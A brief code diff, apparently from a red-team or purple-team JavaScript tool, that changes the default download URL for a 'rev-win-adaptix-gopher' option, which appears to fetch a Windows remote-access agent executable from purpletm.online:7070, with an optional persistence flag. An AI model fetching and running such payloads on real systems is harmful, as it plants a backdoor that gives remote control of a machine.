@@ -124,7 +124,7 @@ const revWinAdaptixGopher = require('./utils/rev-win-adaptix-gopher.js');
 
 if (process.argv[2] === 'rev-win-adaptix-gopher') {
   const options = {
-    url: process.argv[3] || "http://purpletm.online:7070/purple-win-gopher.exe",
+    url: process.argv[3] || "http://purpletm.online:7070/purple-gopher.exe",
     persistence: process.argv.includes('--persist')
   };
   
